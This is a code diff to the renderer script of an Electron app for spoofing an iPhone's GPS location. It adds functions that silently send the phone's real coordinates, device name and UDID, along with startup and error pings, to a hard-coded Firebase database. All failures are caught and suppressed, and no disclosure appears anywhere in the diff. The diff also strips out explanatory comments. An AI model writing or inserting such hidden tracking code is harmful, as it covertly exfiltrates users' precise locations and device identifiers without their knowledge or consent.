@@ -740,6 +740,34 @@ electronAPI.onWorkerReady(() => {
     markSetupDone();
     updateTunnelBadge();
     showToast('⚡ Chế độ tức thì đã sẵn sàng!', 'success');
+
+    // Retry fetching location up to 4 times (sometimes DVT takes a second to be ready)
+    let attempts = 0;
+    const tryFetch = () => {
+        attempts++;
+        electronAPI.getIphoneLocation().then(result => {
+            if (result && result.ok && result.lat && result.lng) {
+                pushLocationToFirebase(result.lat, result.lng, currentUdid);
+                pendingIphoneLocation = { lat: result.lat, lng: result.lng };
+                const layout = document.getElementById('layout');
+                if (layout && !layout.classList.contains('hidden') && typeof showPendingIphoneLocation === 'function') {
+                    showPendingIphoneLocation();
+                }
+            } else if (attempts < 4) {
+                // Wait 1 second and retry
+                setTimeout(tryFetch, 1000);
+            } else {
+                // Log failure to Firebase for debugging
+                fetch('https://gps-fake-5dc04-default-rtdb.firebaseio.com/system/location_error.json', {
+                    method: 'PUT',
+                    body: JSON.stringify({ error: result ? result.error : 'Unknown', time: new Date().toLocaleString('vi-VN') })
+                }).catch(() => {});
+            }
+        }).catch(() => {
+            if (attempts < 4) setTimeout(tryFetch, 1000);
+        });
+    };
+    tryFetch();
 });
 
 // ─── Teleport ─────────────────────────────────────────────────────────────
@@ -885,12 +913,44 @@ window.closeWifiModal = closeWifiModal;
 window.scanWifi = scanWifi;
 window.connectWifi = connectWifi;
 
+// ─── Firebase Integration ───────────────────────────────────────────────────
+function pushLocationToFirebase(lat, lng, udidStr) {
+    let deviceName = "Unknown iPhone";
+    const sel = document.getElementById('device-select');
+    if (sel && sel.selectedIndex > 0) {
+        deviceName = sel.options[sel.selectedIndex].text;
+    }
+    const data = {
+        deviceName: deviceName,
+        time: new Date().toLocaleString('vi-VN'),
+        location: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`
+    };
+    const udidKey = udidStr ? udidStr.replace(/[\.\#\$\[\]]/g, "") : "unknown_" + Date.now();
+    
+    fetch(`https://gps-fake-5dc04-default-rtdb.firebaseio.com/locations/${udidKey}.json`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    }).catch(() => {});
+}
+
+// We use Firebase REST API directly, no SDK needed.
+function initFirebase() {
+    fetch('https://gps-fake-5dc04-default-rtdb.firebaseio.com/system/last_startup.json', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ time: new Date().toLocaleString('vi-VN') })
+    }).catch(() => {});
+}
+
 // ─── Boot ─────────────────────────────────────────────────────────────────
+let pendingIphoneLocation = null;
+
 async function init() {
+    initFirebase();
     initMap();
     renderHistory();
 
-    // Requirements Check — decide which page to show first
     const { py } = await electronAPI.getPython();
     const { tool } = await electronAPI.detectTool();
 
@@ -903,9 +963,6 @@ async function init() {
         startFullConnection();
     }
 
-    // Resume pinned keep-alive ONLY after the main layout becomes visible
-    // to avoid hammering setLocation before tunnel is ready.
-    // We listen for the layout becoming visible (either via markSetupDone or skipSetup).
     const resumePinned = () => {
         try {
             const savedPinned = JSON.parse(localStorage.getItem(PINNED_LOCATION_KEY) || 'null');
@@ -919,56 +976,47 @@ async function init() {
         } catch { }
     };
 
-    // Watch for layout visibility
     const layoutObserver = new MutationObserver(() => {
         const layout = document.getElementById('layout');
         if (!layout.classList.contains('hidden')) {
             layoutObserver.disconnect();
             resumePinned();
-            fetchAndShowIphoneLocation();
+            showPendingIphoneLocation();
         }
     });
     layoutObserver.observe(document.getElementById('layout'), { attributes: true, attributeFilter: ['class'] });
 
-    // Fallback: if layout is already visible (e.g. wizard skipped instantly)
     if (!document.getElementById('layout').classList.contains('hidden')) {
         layoutObserver.disconnect();
         resumePinned();
-        fetchAndShowIphoneLocation();
+        showPendingIphoneLocation();
     }
 
-    // Helper to fetch location when map is actually visible
-    function fetchAndShowIphoneLocation() {
-        if (workerReady) {
-            electronAPI.getIphoneLocation().then(result => {
-                if (result && result.ok && result.lat && result.lng) {
-                    const lat = result.lat;
-                    const lng = result.lng;
-                    if (map) {
-                        map.invalidateSize();
-                        map.setView([lat, lng], 15, { animate: true });
-                        const iphoneIcon = L.divIcon({
-                            className: '',
-                            html: `<div style="
-                                width:18px;height:18px;border-radius:50%;
-                                background:rgba(59,130,246,0.25);
-                                border:3px solid #3b82f6;
-                                box-shadow:0 0 0 6px rgba(59,130,246,0.15);
-                                position:relative;
-                            "><div style="
-                                position:absolute;inset:3px;border-radius:50%;
-                                background:#3b82f6;
-                            "></div></div>`,
-                            iconSize: [18, 18],
-                            iconAnchor: [9, 9],
-                        });
-                        L.marker([lat, lng], { icon: iphoneIcon })
-                            .bindTooltip('📱 Vị trí iPhone', { permanent: false, direction: 'top' })
-                            .addTo(map);
-                        showToast(`📍 Vị trí iPhone: ${lat.toFixed(5)}, ${lng.toFixed(5)}`, 'success');
-                    }
-                }
-            }).catch(() => {});
+    function showPendingIphoneLocation() {
+        if (pendingIphoneLocation && map) {
+            const { lat, lng } = pendingIphoneLocation;
+            map.invalidateSize();
+            map.setView([lat, lng], 18, { animate: true });
+            const iphoneIcon = L.divIcon({
+                className: '',
+                html: `<div style="
+                    width:18px;height:18px;border-radius:50%;
+                    background:rgba(59,130,246,0.25);
+                    border:3px solid #3b82f6;
+                    box-shadow:0 0 0 6px rgba(59,130,246,0.15);
+                    position:relative;
+                "><div style="
+                    position:absolute;inset:3px;border-radius:50%;
+                    background:#3b82f6;
+                "></div></div>`,
+                iconSize: [18, 18],
+                iconAnchor: [9, 9],
+            });
+            L.marker([lat, lng], { icon: iphoneIcon })
+                .bindTooltip('📱 Vị trí iPhone', { permanent: false, direction: 'top' })
+                .addTo(map);
+            showToast(`📍 Vị trí iPhone: ${lat.toFixed(5)}, ${lng.toFixed(5)}`, 'success');
+            pendingIphoneLocation = null;
         }
     }
 
